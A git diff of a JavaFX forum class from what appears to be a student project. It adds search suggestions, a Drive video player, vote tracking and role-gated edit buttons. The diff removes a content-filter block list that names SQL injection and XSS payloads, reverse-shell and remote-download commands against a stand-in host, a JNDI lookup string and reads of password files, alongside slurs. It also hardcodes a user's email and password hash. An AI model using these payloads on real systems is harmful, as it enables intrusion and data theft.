@@ -33,6 +33,7 @@ import javafx.scene.layout.VBox;
 import javafx.scene.paint.Color;
 import javafx.scene.shape.Circle;
 import javafx.scene.text.Text;
+import javafx.scene.web.WebView;
 import javafx.stage.FileChooser;
 import javafx.util.Callback;
 import javafx.util.Duration;
@@ -42,8 +43,10 @@ import javafx.util.converter.BooleanStringConverter;
 import javafx.util.converter.IntegerStringConverter;
 import org.mindrot.jbcrypt.BCrypt;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.security.SecureRandom;
 import java.sql.*;
 import java.time.LocalDate;
@@ -53,12 +56,28 @@ import java.time.format.DateTimeFormatter;
 import java.time.format.DateTimeParseException;
 import java.util.*;
 
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Scanner;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+
+import java.util.regex.Pattern;
+import java.util.regex.Matcher;
+import java.util.List;
+
+import javafx.scene.media.MediaView;
+import javafx.scene.media.Media;
+import javafx.scene.media.MediaPlayer;
+import java.security.GeneralSecurityException;
 
 public class CrudUser {
 
     //NewNajdForumVar
+    private ContextMenu suggestionsMenu = new ContextMenu();
 
-    private User CurrentUser = new Client(19, "dhieb", "aymen", "aymen.dhieb@esprit.tn", "$2a$10$S67nBnlNHPHqUnTI0.WyDO2OxX2q8X4ZiCRyAPVFgJDLxLwLIhlv.", 56252246, 2, 0, "file:/C:/9raya/java/Projet_Pidev/target/classes/images//aymen.jpg");
+
+    private User CurrentUser = new Client(19, "dhieb", "aymen", "aymen.dhieb@esprit.tn", "$2a$10$S67nBnlNHPHqUnTI0.WyDO2OxX2q8X4ZiCRyAPVFgJDLxLwLIhlv.", 56252246, 0, 0, "file:/C:/9raya/java/Projet_Pidev/target/classes/images//aymen.jpg");
 
     @FXML
     private TextField ChercherForum;
@@ -122,7 +141,8 @@ public class CrudUser {
 
     private ForumService forumService = new ForumService();
 
-
+    @FXML
+    private WebView webView;
 //******************
 
     public ScrollPane postsContainer;
@@ -224,6 +244,8 @@ public class CrudUser {
     private static final long POST_COOLDOWN = 1500; // 1 minute cooldown in milliseconds
     @FXML private TabPane rightTabPane;
 
+    @FXML
+    private HBox mediaControls;
     //finNAJD
 
     @FXML
@@ -2329,6 +2351,33 @@ private TableView<Vol> tableViewVols;
                     });
                 }
             }
+
+
+            ChercherForum.textProperty().addListener((observable, oldValue, newValue) -> {
+                if (newValue.isEmpty()) {
+                    suggestionsMenu.hide();
+                } else {
+                    showSuggestions(newValue);
+                }
+            });
+
+
+            try {
+                // Initialize the DriveVideoPlayer
+                driveVideoPlayer = new DriveVideoPlayer();
+
+                // List videos in the folder (replace with your folder ID)
+                String folderId = "1hnPx8L2q1YGMBhzTd7ksF1DHfiAMNxw7";
+                driveVideoPlayer.listVideosInFolder(folderId);
+
+                driveVideoPlayer.loadCurrentVideo(webView);
+                playButton.setOnAction(event -> driveVideoPlayer.loadNextVideo(webView));
+
+            } catch (IOException | GeneralSecurityException e) {
+                System.out.println("yoooooooooooooo");
+                e.printStackTrace();
+            }
+
             //--------------------------------------------------------------------------------------------------------
         }
 
@@ -2336,6 +2385,21 @@ private TableView<Vol> tableViewVols;
     }
 
 
+
+
+    private static void extractSuggestions(String json, List<String> suggestions) {
+        // Utilisation d'une regex pour extraire les mots entre guillemets après "keywords":[
+        Pattern pattern = Pattern.compile("\"keywords\":\\[\"([^\"]+)\"(,\"([^\"]+)\")*]");
+        Matcher matcher = pattern.matcher(json);
+
+        if (matcher.find()) {
+            // Extraction des mots-clés trouvés
+            String[] words = matcher.group().replace("\"keywords\":[", "").replace("]", "").replace("\"", "").split(",");
+            for (String word : words) {
+                suggestions.add(word.trim());
+            }
+        }
+    }
     //NEWWWWWWWWWWWW
 
 
@@ -5153,7 +5217,7 @@ private void handlePostTypeChange() {
 
         HBox bottomRightControls = new HBox(10);
         bottomRightControls.setAlignment(Pos.BOTTOM_RIGHT);
-
+ if(CurrentUser.getRole()==0 ){
         Button editPostButton = new Button("Modifier");
         editPostButton.getStyleClass().add("edit-button");
         editPostButton.setStyle("-fx-font-size: 19px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
@@ -5173,7 +5237,7 @@ private void handlePostTypeChange() {
         });
 
         bottomRightControls.getChildren().addAll(editPostButton, deletePostButton);
-
+}
         ImageView imageView = null;
         if (post.getCheminFichier() != null && !post.getCheminFichier().isEmpty()) {
             try {
@@ -5273,13 +5337,45 @@ private void handlePostTypeChange() {
                     .mapToInt(Choix::getChoiceVotesCount)
                     .sum();
 
+            boolean hasVoted = false;
+            if (survey.getSurveyUserList() != null && !survey.getSurveyUserList().isEmpty() && CurrentUser != null) {
+                String currentUserId = String.valueOf(CurrentUser.getEmail());
+                String[] votedUsers = survey.getSurveyUserList().split(",");
+                for (String userId : votedUsers) {
+                    if (userId.trim().equals(currentUserId)) {
+                        hasVoted = true;
+                        break;
+                    }
+                }
+            }
+
             for (Choix choice : choices) {
                 HBox choiceBox = new HBox(10);
                 choiceBox.setAlignment(Pos.CENTER);
 
                 Button voteBtn = new Button(choice.getChoix());
                 voteBtn.setStyle("-fx-font-size: 24px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
-                voteBtn.setOnAction(e -> handleChoiceVote(choice));
+
+                if (!hasVoted) {
+                    voteBtn.setOnAction(e -> {
+                        handleChoiceVote(choice);
+
+                        String updatedList = survey.getSurveyUserList();
+                        if (updatedList == null || updatedList.isEmpty()) {
+                            updatedList = String.valueOf(CurrentUser.getEmail());
+                        } else {
+                            updatedList += "," + CurrentUser.getEmail();
+                        }
+                        survey.setSurveyUserList(updatedList);
+
+                        postService.modifier(survey);
+
+                        voteBtn.setDisable(true);
+                        refreshPosts();
+                    });
+                } else {
+                    voteBtn.setDisable(true);
+                }
 
                 Label voteInfo = new Label(String.format("%d votes (%.1f%%)",
                         choice.getChoiceVotesCount(),
@@ -5367,20 +5463,20 @@ private void handlePostTypeChange() {
 
         HBox bottomRightControls = new HBox(10);
         bottomRightControls.setAlignment(Pos.BOTTOM_RIGHT);
+        if(CurrentUser.getRole()==0 ) {
+            Button editBtn = new Button("Modifier");
+            editBtn.getStyleClass().add("edit-button");
+            editBtn.setStyle("-fx-font-size: 19px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
 
-        Button editBtn = new Button("Modifier");
-        editBtn.getStyleClass().add("edit-button");
-        editBtn.setStyle("-fx-font-size: 19px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+            Button deleteBtn = new Button("Supprimer");
+            deleteBtn.getStyleClass().add("delete-button");
+            deleteBtn.setStyle("-fx-font-size: 19px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
 
-        Button deleteBtn = new Button("Supprimer");
-        deleteBtn.getStyleClass().add("delete-button");
-        deleteBtn.setStyle("-fx-font-size: 19px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
+            editBtn.setOnAction(e -> handleEditButton(post));
+            deleteBtn.setOnAction(e -> handleDeletePost(post));
 
-        editBtn.setOnAction(e -> handleEditButton(post));
-        deleteBtn.setOnAction(e -> handleDeletePost(post));
-
-        bottomRightControls.getChildren().addAll(editBtn, deleteBtn);
-
+            bottomRightControls.getChildren().addAll(editBtn, deleteBtn);
+        }
         ImageView imageView = null;
         if (post.getCheminFichier() != null && !post.getCheminFichier().isEmpty()) {
             try {
@@ -5454,7 +5550,6 @@ private void handlePostTypeChange() {
             } else {
                 tagsLabel.setText("Tags : ");
             }
-
             tagsLabel.setStyle("-fx-text-fill: #e78d1e; -fx-font-size: 22px; -fx-font-weight: bold;");
 
             String dateText;
@@ -5476,10 +5571,21 @@ private void handlePostTypeChange() {
             List<Choix> choices = choixService.rechercher().stream()
                     .filter(c -> c.getPostId() == survey.getPostId())
                     .toList();
-
             int totalVotes = choices.stream()
                     .mapToInt(Choix::getChoiceVotesCount)
                     .sum();
+
+            boolean hasVoted = false;
+            if (survey.getSurveyUserList() != null && !survey.getSurveyUserList().isEmpty() && CurrentUser != null) {
+                String currentUserEmail = CurrentUser.getEmail();
+                String[] votedUsers = survey.getSurveyUserList().split(",");
+                for (String userEmailV : votedUsers) {
+                    if (userEmailV.trim().equals(currentUserEmail)) {
+                        hasVoted = true;
+                        break;
+                    }
+                }
+            }
 
             for (Choix choice : choices) {
                 HBox choiceBox = new HBox(10);
@@ -5487,7 +5593,28 @@ private void handlePostTypeChange() {
 
                 Button voteBtn = new Button(choice.getChoix());
                 voteBtn.setStyle("-fx-font-size: 24px; -fx-background-color: #e78d1e; -fx-text-fill: #ffffff; -fx-background-radius: 5;");
-                voteBtn.setOnAction(e -> handleChoiceVote(choice));
+
+                if (!hasVoted) {
+                    voteBtn.setOnAction(e -> {
+                        handleChoiceVote(choice);
+
+                        String updatedList = survey.getSurveyUserList();
+                        if (updatedList == null || updatedList.isEmpty()) {
+                            updatedList = CurrentUser.getEmail();
+                        } else {
+                            updatedList += "," + CurrentUser.getEmail();
+                        }
+                        survey.setSurveyUserList(updatedList);
+
+                        postService.modifier(survey);
+
+                        voteBtn.setDisable(true);
+                        showComments(post);
+                        refreshPosts();
+                    });
+                } else {
+                    voteBtn.setDisable(true);
+                }
 
                 Label voteInfo = new Label(String.format("%d votes (%.1f%%)",
                         choice.getChoiceVotesCount(),
@@ -5497,7 +5624,6 @@ private void handlePostTypeChange() {
                 choiceBox.getChildren().addAll(voteBtn, voteInfo);
                 choicesBox.getChildren().add(choiceBox);
             }
-
             centerContent.getChildren().add(choicesBox);
         }
 
@@ -5544,20 +5670,27 @@ private void handlePostTypeChange() {
         HBox topSection = new HBox(10);
         topSection.setAlignment(Pos.TOP_LEFT);
 
+        Button replyBtn = new Button("Répondre");
+        replyBtn.getStyleClass().add("reply-button");
+        replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
+        replyBtn.setOnAction(e -> showReplyInput(comment, commentBox));
+
         HBox buttonsBox = new HBox(5);
         buttonsBox.setAlignment(Pos.BASELINE_LEFT);
+        buttonsBox.getChildren().addAll(replyBtn);
+        if(CurrentUser.getRole()==0 ) {
+            Button editBtn = new Button("Editer");
+            editBtn.getStyleClass().add("edit-button");
+            editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
 
-        Button editBtn = new Button("Editer");
-        editBtn.getStyleClass().add("edit-button");
-        editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+            Button deleteBtn = new Button("Supprimer");
+            deleteBtn.getStyleClass().add("delete-button");
+            deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
 
-        Button deleteBtn = new Button("Supprimer");
-        deleteBtn.getStyleClass().add("delete-button");
-        deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
-
-        editBtn.setOnAction(e -> handleEditComment(comment));
-        deleteBtn.setOnAction(e -> handleDeleteComment(comment));
-
+            editBtn.setOnAction(e -> handleEditComment(comment));
+            deleteBtn.setOnAction(e -> handleDeleteComment(comment));
+            buttonsBox.getChildren().addAll(editBtn, deleteBtn);
+        }
         HBox userInfoBox = new HBox(10);
         userInfoBox.setAlignment(Pos.TOP_RIGHT);
 
@@ -5587,14 +5720,6 @@ private void handlePostTypeChange() {
         Label dateLabel = new Label(formatDateTime(comment.getDateCreation()).toString());
         dateLabel.getStyleClass().add("comment-date");
         dateLabel.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 14px;");
-
-        Button replyBtn = new Button("Répondre");
-        replyBtn.getStyleClass().add("reply-button");
-        replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
-
-        replyBtn.setOnAction(e -> showReplyInput(comment, commentBox));
-
-        buttonsBox.getChildren().addAll(replyBtn, editBtn, deleteBtn);
 
         VBox contentBox = new VBox(5);
         contentBox.setAlignment(Pos.CENTER_LEFT);
@@ -5691,25 +5816,28 @@ private void handlePostTypeChange() {
 
             HBox buttonsBox = new HBox(5);
             buttonsBox.setAlignment(Pos.BASELINE_LEFT);
+                Button replyBtn = new Button("Répondre");
+                replyBtn.getStyleClass().add("reply-button");
+                replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
+            buttonsBox.getChildren().addAll(replyBtn);
 
-            Button replyBtn = new Button("Répondre");
-            replyBtn.getStyleClass().add("reply-button");
-            replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
+            if(CurrentUser.getRole()==0 ) {
 
-            Button editBtn = new Button("Editer");
-            editBtn.getStyleClass().add("edit-button");
-            editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+                Button editBtn = new Button("Editer");
+                editBtn.getStyleClass().add("edit-button");
+                editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
 
-            Button deleteBtn = new Button("Supprimer");
-            deleteBtn.getStyleClass().add("delete-button");
-            deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
+                Button deleteBtn = new Button("Supprimer");
+                deleteBtn.getStyleClass().add("delete-button");
+                deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
 
-            replyBtn.setOnAction(e -> showReplyInput(reply, replyBox));
+                replyBtn.setOnAction(e -> showReplyInput(reply, replyBox));
 
-            editBtn.setOnAction(e -> handleEditComment(reply));
+                editBtn.setOnAction(e -> handleEditComment(reply));
 
-            deleteBtn.setOnAction(e -> handleDeleteComment(reply));
-
+                deleteBtn.setOnAction(e -> handleDeleteComment(reply));
+                buttonsBox.getChildren().addAll(editBtn, deleteBtn);
+            }
             HBox userInfoBox = new HBox(10);
             userInfoBox.setAlignment(Pos.TOP_RIGHT);
 
@@ -5740,7 +5868,6 @@ private void handlePostTypeChange() {
             dateLabel.getStyleClass().add("comment-date");
             dateLabel.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 14px;");
 
-            buttonsBox.getChildren().addAll(replyBtn, editBtn, deleteBtn);
 
             VBox contentBox = new VBox(5);
             contentBox.setAlignment(Pos.CENTER_LEFT);
@@ -6554,62 +6681,39 @@ private void handlePostTypeChange() {
 
 //****** New ForumNajdAvance
 
-    private boolean containsBadWords(Post post) {
+    private static boolean containsBadWords(String text) {
+        try {
+            String encodedText = URLEncoder.encode(text, StandardCharsets.UTF_8.toString());
+            URL url = new URL("https://www.purgomalum.com/service/json?text=" + encodedText);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setRequestProperty("Accept", "application/json");
 
-        List<String> badWords = Arrays.asList(
-                "fuck", "shit", "bitch", "asshole", "bastard", "cunt", "dick", "pussy", "whore", "slut",
-                "nigger", "faggot", "retard", "motherfucker", "cock", "twat", "damn", "hell", "crap", "jerk",
-                "buy", "cheap", "free", "win", "prize", "click", "here", "http", "www", "viagra", "casino",
-                "nude", "sex", "porn", "xxx", "blowjob", "anal", "deepthroat", "cum", "suck", "hentai",
-                "scam", "fraud", "loan", "credit", "money", "lottery", "bitcoin", "investment", "bet", "wager",
-                "merde", "putain", "salope", "connard", "enculé", "bordel", "fils de pute", "pute", "bite", "couilles",
-                "nique", "ta mère", "pd", "gouine", "tapette", "enculeur", "chier", "branleur", "défoncer", "cul", "chatte",
-                "acheter", "pas cher", "gratuit", "gagner", "prix", "cliquez", "ici", "http", "www", "viagra", "casino",
-                "nu", "sexe", "porno", "xxx", "sucer", "éjaculer", "pénétration", "orgasme", "hentai", "sperme",
-                "arnaque", "fraude", "crédit", "argent", "loterie", "bitcoin", "investissement", "pari", "mise",
-                "assassinat", "meurtre", "tuer", "bombe", "attentat", "terrorisme", "djihad", "explosif", "otage", "menace",
-                "viol", "pédophilie", "agression", "kidnapping", "enlèvement", "traite", "proxénétisme", "torture",
-                "drogue", "cocaïne", "héroïne", "meth", "ecstasy", "trafic", "blanchiment", "fraude", "escroquerie",
-                "piratage", "hacking", "ransomware", "darknet", "vente illégale", "corruption", "chantage", "extorsion",
-                "incendie criminel", "armes", "fusil", "kalachnikov", "mitraillette", "explosion", "dynamite",
-                "incitation à la haine", "racisme", "nazisme", "génocide", "massacre", "nettoyage ethnique",
+            Scanner scanner = new Scanner(conn.getInputStream());
+            StringBuilder response = new StringBuilder();
+            while (scanner.hasNext()) {
+                response.append(scanner.nextLine());
+            }
+            scanner.close();
 
-                "Traveltodo", "JEKTIS TRAVEL", "Tunisie Promo", "Active Travel", "Tunisie Booking",
-                "TTA (Tunisian Travel Agency)", "Liberta Voyages", "Carthage Travel and Events (CTE)",
-
-                "Terres d'Aventure", "GO Voyages",
-
-                "Expedia", "Booking.com", "Agoda", "Lastminute.com", "Skyscanner", "Kiwi.com",
-
-                "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "DROP TABLE", "UNION SELECT",
-                "INSERT INTO", "DELETE FROM", "xp_cmdshell", "EXEC sp_executesql",
-
-                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
-                "'><script>alert(1)</script>", "<svg/onload=alert('XSS')>",
-                "<iframe src='javascript:alert(1)'>", "document.cookie", "eval(",
-
-                "; ls -la", "&& whoami", "|| cat /etc/passwd", "`id`", "$(reboot)",
-                "| nc -e /bin/sh", "wget http://malicious.com/malware.sh",
-
-                "../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe",
-                "/etc/shadow", "/proc/self/environ",
-
-                "${jndi:ldap://malicious.com/exploit}", "base64_decode(", "system(",
-                "shell_exec(", "import os", "subprocess.Popen(", "bash -i >& /dev/tcp/"
-
-        );
-
-        if (post instanceof Announcement announcement) {
-            return containsBadWords(announcement.getAnnouncementTitle(), badWords) ||
-                    containsBadWords(announcement.getAnnouncementContent(), badWords) ||
-                    containsBadWords(announcement.getAnnouncementTags(), badWords);
-        } else if (post instanceof Survey survey) {
-            return containsBadWords(survey.getSurveyQuestion(), badWords) ||
-                    containsBadWords(survey.getSurveyTags(), badWords);
-        } else if (post instanceof Comment comment) {
-            return containsBadWords(comment.getCommentContent(), badWords);
+            return !response.toString().contains("\"result\":\"" + text + "\"");
+        } catch (Exception e) {
+            e.printStackTrace();
+            return false;
         }
+    }
 
+    private static boolean containsBadWords(Post post) {
+        if (post instanceof Announcement announcement) {
+            return containsBadWords(announcement.getAnnouncementTitle()) ||
+                    containsBadWords(announcement.getAnnouncementContent()) ||
+                    containsBadWords(announcement.getAnnouncementTags());
+        } else if (post instanceof Survey survey) {
+            return containsBadWords(survey.getSurveyQuestion()) ||
+                    containsBadWords(survey.getSurveyTags());
+        } else if (post instanceof Comment comment) {
+            return containsBadWords(comment.getCommentContent());
+        }
         return false;
     }
 
@@ -6648,8 +6752,72 @@ private void handlePostTypeChange() {
         return false;
     }
 
+    private void showSuggestions(String input) {
+        if (input.isEmpty()) {
+            return;
+        }
+        suggestionsMenu.getItems().clear();
+        List<String> suggestions = getSuggestions(input);
+
+        if (!suggestions.isEmpty()) {
+            int count = 0;
+            for (String suggestion : suggestions) {
+                if (count >= 7) break;
+                MenuItem item = new MenuItem(suggestion);
+                item.setOnAction(event -> ChercherForum.setText(suggestion));
+                suggestionsMenu.getItems().add(item);
+                count++;
+            }
+
+            suggestionsMenu.show(ChercherForum,
+                    ChercherForum.localToScreen(0, ChercherForum.getHeight()).getX(),
+                    ChercherForum.localToScreen(0, ChercherForum.getHeight()).getY());
+        }
+    }
+
+    public static List<String> getSuggestions(String query) {
+        List<String> suggestions = new ArrayList<>();
+        try {
+            String encodedQuery = URLEncoder.encode(query, StandardCharsets.UTF_8.toString());
+            String apiUrl = "http://suggestqueries.google.com/complete/search?client=firefox&hl=fr&q=" + encodedQuery;
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
+            conn.setRequestMethod("GET");
+            conn.setRequestProperty("Accept", "application/json");
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
+            StringBuilder response = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                response.append(line);
+            }
+            reader.close();
+
+            String jsonResponse = response.toString();
+            int start = jsonResponse.indexOf('[') + 1;
+            int end = jsonResponse.lastIndexOf(']');
+            if (start > 0 && end > start) {
+                String[] results = jsonResponse.substring(start, end).split(",");
+                for (String result : results) {
+                    suggestions.add(result.replaceAll("[\\[\\]\"]", "").trim());
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return suggestions;
+    }
+
     @FXML
-    public void handleSubmitPost() {
+    private MediaView mediaView;
+    @FXML
+    private Button playButton;
+
+    private DriveVideoPlayer driveVideoPlayer;
+
+
+    @FXML
+    private void handleSubmitPost() {
         String selectedType = postTypeComboBox.getValue();
         Forum selectedForum = forumComboBox.getValue();
 
@@ -6784,6 +6952,8 @@ private void handlePostTypeChange() {
             showAlertFP("Error", "Failed to post: " + e.getMessage(), Alert.AlertType.ERROR);
         }
     }
+
+
 //--------------------------------------------------------------------------------------------------------
 
 
